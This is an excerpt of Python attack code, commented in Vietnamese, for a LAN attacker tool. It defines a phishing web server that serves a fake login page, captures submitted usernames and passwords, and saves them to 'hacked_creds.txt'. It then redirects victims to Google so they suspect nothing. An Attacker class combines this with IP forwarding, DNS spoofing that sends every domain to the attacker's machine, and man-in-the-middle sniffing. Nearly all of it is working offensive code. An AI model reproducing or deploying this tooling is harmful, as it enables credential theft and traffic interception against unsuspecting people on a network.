...
class PhishingServer:
    ...
    def start(self):
        # Định nghĩa cách xử lý request
        class PhishingHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                try:
                    with open("fake_web.html", "rb") as f:
                        self.send_response(200)
            ...
            def do_POST(self):
                # Khi nạn nhân nhập pass và bấm nút
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                parsed_data = urllib.parse.parse_qs(post_data)
                
                # Lấy user/pass
                user = parsed_data.get('username', [''])[0]
                passwd = parsed_data.get('password', [''])[0]
                
                # IN RA MÀN HÌNH MÀU ĐỎ LÈ
                print(f"\n\n{'='*50}")
                print(f"🔥🔥🔥 BINGO! NẠN NHÂN ĐÃ SẬP BẪY! 🔥🔥🔥")
                print(f"👤 Username: {user}")
                print(f"🔑 Password: {passwd}")
                print(f"{'='*50}\n")
                
                # Lưu vào file riêng cho chắc
                with open("hacked_creds.txt", "a") as f:
                    f.write(f"User: {user} | Pass: {passwd}\n")

                # Chuyển hướng nạn nhân về Google (để họ tưởng đã xong)
                self.send_response(302)
                self.send_header('Location', 'http://www.google.com')
                self.end_headers()
            
            # Tắt mấy cái log request lặt vặt cho đỡ rối mắt
            def log_message(self, format, *args): return

        # Chạy server
        console.print(f"[green]🕸️  Phishing Server đang chạy trên Port {self.port}...[/green]")
        self.httpd = HTTPServer(('0.0.0.0', self.port), PhishingHandler)
...
class Attacker:
    ...
    def start(self, mode='netcut', enable_dashboard=True):
        ...
        if mode == 'netcut':
            ...
            self.set_ip_forward(True)    
            # 1. Bật Web Server giả
            myserver = PhishingServer(port=80)
            myserver.start()
            # 2. Cấu hình DNS Spoofing (TRỎ TẤT CẢ VỀ MÁY MÌNH)
            # Lấy IP của chính máy Kali
            my_ip = self.gateway_ip # Hoặc lấy IP LAN chính xác
            # Lưu ý: Đoạn này nên dùng hàm lấy IP local, nhưng tạm thời dùng fake_ip người dùng nhập hoặc fix cứng 
            console.print(f"[bold yellow]⚠️  Chế độ Phishing: Mọi truy cập của nạn nhân sẽ bị lái về trang Fake![/bold yellow]")  
            # Khởi động FakeDNS trỏ mọi domain về máy này
            # targets="" nghĩa là tất cả domain
            self.fake_dns = FakeDNS(fake_ip=get_if_addr(self.iface), dashboard=self.dashboard, target_domains="") 
            self.fake_dns.start()
            
            # 3. Bắt đầu tấn công MITM
            threading.Thread(target=self.mitm_sniff, daemon=True).start()
